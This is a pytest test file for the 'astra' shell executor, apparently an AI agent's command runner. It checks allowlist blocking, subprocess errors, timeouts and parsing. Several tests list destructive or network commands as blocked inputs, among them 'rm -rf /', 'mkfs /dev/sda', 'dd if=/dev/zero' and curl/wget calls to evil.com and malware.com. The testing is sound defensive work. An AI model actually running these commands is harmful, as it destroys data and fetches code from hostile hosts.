"""Comprehensive tests for shell executor with mocking and edge cases."""

from unittest.mock import MagicMock, patch

import pytest

from astra.tools.shell import ShellExecutor, ShellResult


class TestShellExecutorBasics:
    """Basic shell executor tests."""

    @pytest.fixture
    def mock_config(self):
        """Create mock config with allowlist."""
        config = MagicMock()
        config.is_command_allowed = MagicMock(side_effect=lambda cmd: cmd in ["git", "npm", "python", "pytest", "node"])
        config.command_allowlist = ["git", "npm", "python", "pytest", "node"]
        return config

    @pytest.fixture
    def executor(self, mock_config):
        """Create executor with mocked config."""
        with patch('astra.tools.shell.get_config', return_value=mock_config):
            return ShellExecutor(timeout=30)


class TestAllowlistEnforcement:
    """Test command allowlist enforcement."""

    @pytest.fixture
    def executor_with_callback(self):
        """Create executor with blocked callback."""
        blocked_commands = []

        def on_blocked(binary, command):
            blocked_commands.append((binary, command))

        config = MagicMock()
        config.is_command_allowed = MagicMock(side_effect=lambda cmd: cmd in ["git", "npm"])

        with patch('astra.tools.shell.get_config', return_value=config):
            executor = ShellExecutor(on_blocked=on_blocked)
            yield executor, blocked_commands

    def test_allowed_command_not_blocked(self, executor_with_callback):
        """Test that allowed commands are not blocked."""
        executor, blocked = executor_with_callback

        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

            result = executor.run(["git", "status"])

            assert result.blocked == False
            assert len(blocked) == 0

    def test_disallowed_command_blocked(self, executor_with_callback):
        """Test that disallowed commands are blocked."""
        executor, blocked = executor_with_callback

        result = executor.run(["rm", "-rf", "/"])

        assert result.blocked == True
        assert result.success == False
        assert len(blocked) == 1
        assert blocked[0][0] == "rm"

    @pytest.mark.parametrize("dangerous_command", [
        ["rm", "-rf", "/*"],
        ["sudo", "something"],
        ["curl", "http://evil.com"],
        ["wget", "http://malware.com"],
        ["dd", "if=/dev/zero"],
        ["mkfs", "/dev/sda"],
    ])
    def test_dangerous_commands_blocked(self, dangerous_command):
        """Test that dangerous commands are blocked by default."""
        config = MagicMock()
        config.is_command_allowed = MagicMock(return_value=False)

        with patch('astra.tools.shell.get_config', return_value=config):
            executor = ShellExecutor()
            result = executor.run(dangerous_command)

            assert result.blocked == True
            assert "not permitted" in result.stderr


class TestCommandExecution:
    """Test actual command execution (mocked subprocess)."""

    @pytest.fixture
    def permissive_executor(self):
        """Create executor that allows all commands."""
        config = MagicMock()
        config.is_command_allowed = MagicMock(return_value=True)

        with patch('astra.tools.shell.get_config', return_value=config):
            yield ShellExecutor(timeout=30)

    def test_successful_command(self, permissive_executor):
        """Test handling of successful command."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="command output",
                stderr=""
            )

            result = permissive_executor.run(["echo", "hello"])

            assert result.success == True
            assert result.stdout == "command output"
            assert result.return_code == 0

    def test_failed_command(self, permissive_executor):
        """Test handling of failed command."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                returncode=1,
                stdout="",
                stderr="error message"
            )

            result = permissive_executor.run(["false"])

            assert result.success == False
            assert result.return_code == 1
            assert "error" in result.stderr

    def test_command_timeout(self, permissive_executor):
        """Test handling of command timeout."""
        import subprocess

        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd=["sleep"], timeout=30)

            result = permissive_executor.run(["sleep", "100"])

            assert result.success == False
            assert "timed out" in result.stderr


class TestRunString:
    """Test run_string method."""

    @pytest.fixture
    def executor(self):
        config = MagicMock()
        config.is_command_allowed = MagicMock(return_value=True)

        with patch('astra.tools.shell.get_config', return_value=config):
            yield ShellExecutor()

    def test_simple_command_string(self, executor):
        """Test parsing simple command string."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

            executor.run_string("git status")

            mock_run.assert_called_once()
            call_args = mock_run.call_args[0][0]
            assert call_args == ["git", "status"]

    def test_command_string_with_quotes(self, executor):
        """Test parsing command string with quotes."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

            executor.run_string('git commit -m "feat: add feature"')

            call_args = mock_run.call_args[0][0]
            assert call_args == ["git", "commit", "-m", "feat: add feature"]

    def test_invalid_command_string(self, executor):
        """Test handling of invalid command string (unclosed quotes)."""
        result = executor.run_string('git commit -m "unclosed')

        assert result.success == False
        assert result.blocked == True
        assert "Failed to parse" in result.stderr


class TestEdgeCases:
    """Edge case tests for shell executor."""

    @pytest.fixture
    def executor(self):
        config = MagicMock()
        config.is_command_allowed = MagicMock(return_value=True)

        with patch('astra.tools.shell.get_config', return_value=config):
            yield ShellExecutor()

    def test_empty_command(self, executor):
        """Test handling of empty command list."""
        result = executor.run([])

        assert result.success == False
        assert result.blocked == True

    def test_none_handling(self, executor):
        """Test that None values are handled gracefully."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

            # cwd=None should work
            executor.run(["git", "status"], cwd=None)

            call_kwargs = mock_run.call_args[1]
            assert call_kwargs['cwd'] is None

    def test_working_directory(self, executor):
        """Test that cwd is passed correctly."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

            executor.run(["ls"], cwd="/tmp/test")

            call_kwargs = mock_run.call_args[1]
            assert call_kwargs['cwd'] == "/tmp/test"

    def test_custom_env(self, executor):
        """Test that custom environment variables are passed."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

            executor.run(["node", "script.js"], env={"NODE_ENV": "test"})

            call_kwargs = mock_run.call_args[1]
            assert call_kwargs['env'] == {"NODE_ENV": "test"}

    def test_custom_timeout(self, executor):
        """Test that custom timeout is respected."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

            executor.run(["npm", "test"], timeout=60)

            call_kwargs = mock_run.call_args[1]
            assert call_kwargs['timeout'] == 60


class TestSubprocessExceptions:
    """Test handling of various subprocess exceptions."""

    @pytest.fixture
    def executor(self):
        config = MagicMock()
        config.is_command_allowed = MagicMock(return_value=True)

        with patch('astra.tools.shell.get_config', return_value=config):
            yield ShellExecutor()

    def test_file_not_found(self, executor):
        """Test handling when command binary not found."""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = FileNotFoundError("Command not found")

            result = executor.run(["nonexistent_command"])

            assert result.success == False
            assert "not found" in result.stderr.lower() or "FileNotFoundError" in result.stderr

    def test_permission_denied(self, executor):
        """Test handling of permission denied."""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = PermissionError("Permission denied")

            result = executor.run(["./restricted_script"])

            assert result.success == False
            assert "Permission" in result.stderr

    def test_os_error(self, executor):
        """Test handling of general OS error."""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = OSError("General OS error")

            result = executor.run(["some", "command"])

            assert result.success == False


class TestShellResultDataclass:
    """Test ShellResult dataclass behavior."""

    def test_result_fields(self):
        """Test all fields are accessible."""
        result = ShellResult(
            success=True,
            stdout="output",
            stderr="",
            return_code=0,
            command=["git", "status"],
            blocked=False,
            message=None
        )

        assert result.success == True
        assert result.stdout == "output"
        assert result.stderr == ""
        assert result.return_code == 0
        assert result.command == ["git", "status"]
        assert result.blocked == False
        assert result.message is None

    def test_blocked_result_with_message(self):
        """Test blocked result includes helpful message."""
        result = ShellResult(
            success=False,
            stdout="",
            stderr="Command 'rm' is not permitted.",
            return_code=-1,
            command=["rm", "-rf", "/"],
            blocked=True,
            message="Add via `/config allowlist add rm` to permit."
        )

        assert result.blocked == True
        assert "/config allowlist" in result.message
